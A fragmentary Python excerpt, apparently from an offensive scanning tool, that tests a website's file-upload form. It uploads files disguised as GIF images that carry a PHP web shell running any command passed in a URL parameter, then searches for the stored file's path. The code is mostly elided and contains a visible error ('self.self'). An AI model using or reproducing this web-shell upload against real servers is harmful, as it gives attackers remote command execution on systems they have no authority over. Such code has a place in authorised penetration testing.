    ...
    def enumerate(self, katana):
        ...
        if action and method and upload and file:
            ...
            for ext in extensions:
                r = method(self.target.upstream.decode('utf-8').rstrip('/') + '/' + action,
                           files={file: ('anything.%s' % ext,
                                         StringIO(f'GIF89a;{web.delim}<?php system($_GET["c"]) ?>{web.delim}'),
                                         'image/gif')})
                ...
                if location:
                    for file_path in location:
                        if file_path.startswith(self.target.url_root): file_path = file_path[
                                                                                   len(self.self.target.url_root):]
